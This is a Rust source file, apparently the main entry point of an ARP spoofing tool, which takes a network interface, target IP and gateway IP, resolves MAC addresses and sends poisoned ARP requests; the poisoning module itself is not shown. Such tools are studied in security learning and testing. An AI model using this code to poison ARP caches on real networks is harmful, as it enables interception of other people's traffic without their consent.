use anyhow::Result;
use clap::Parser;
mod cli;
// use pcap::Device;
use std::net::IpAddr;
mod arp;
use arp::ArpSpoofer;

fn main() -> Result<()> {
    if !check_sudo() {
        println!("This program must be run with sudo/root privileges.");
        std::process::exit(1);
    }

    let cli = cli::Cli::parse();
    let (interface, target_ip, gateway_ip) = (cli.interface, cli.target, cli.gateway);

    let target_ip: IpAddr = target_ip.parse()?;
    let gateway_ip: IpAddr = gateway_ip.parse()?;

    let network_interface = match get_network_interface(&interface) {
        Some(iface) => iface,
        None => {
            println!("Network interface '{}' not found.", interface);
            std::process::exit(1);
        }
    };
    // dbg!(&network_interface);

    // let pcap_device = match Device::list()?
    //     .into_iter()
    //     .find(|d| d.name == network_interface.name)
    // {
    //     Some(dev) => dev,
    //     None => {
    //         println!(
    //             "PCAP device for interface '{}' not found.",
    //             network_interface.name
    //         );
    //         std::process::exit(1);
    //     }
    // };
    // dbg!(&pcap_device);

    let self_ip = network_interface.ips.iter().find_map(|ip_network| {
        if let IpAddr::V4(ipv4) = ip_network.ip() {
            Some(ipv4)
        } else {
            None
        }
    });
    let self_mac = network_interface.mac.unwrap();

    let mut arp_spoofer = ArpSpoofer {
        target_ip,
        gateway_ip,
        target_mac: [0; 6],
        gateway_mac: [0; 6],
        self_ip: self_ip.unwrap(),
        self_mac: self_mac.octets(),
        interface: network_interface,
    };

    let target_mac = arp_spoofer.find_target_mac();
    arp_spoofer.target_mac = target_mac;

    let gateway_mac = arp_spoofer.find_gateway_mac();
    arp_spoofer.gateway_mac = gateway_mac;

    arp_spoofer.send_poisoned_req();

    Ok(())
}

fn get_network_interface(iface: &str) -> Option<pnet_datalink::NetworkInterface> {
    let interfaces = pnet_datalink::interfaces();
    for interface in interfaces {
        if interface.name == iface {
            return Some(interface);
        }
    }
    None
}

// trait GetDetails {
//     fn ip_addr(&self) -> Option<Ipv4Addr>;
// }
//
// impl GetDetails for pcap::Device {
//     fn ip_addr(&self) -> Option<Ipv4Addr> {
//         self.addresses
//             .iter()
//             .filter_map(|i| match i.addr {
//                 IpAddr::V4(ipv4) => Some(ipv4),
//                 _ => None,
//             })
//             .next_back()
//     }
// }

fn check_sudo() -> bool {
    use is_sudo::RunningAs;
    let is_sudo = is_sudo::check();

    match is_sudo {
        RunningAs::Root => true,
        RunningAs::User => false,
    }
}
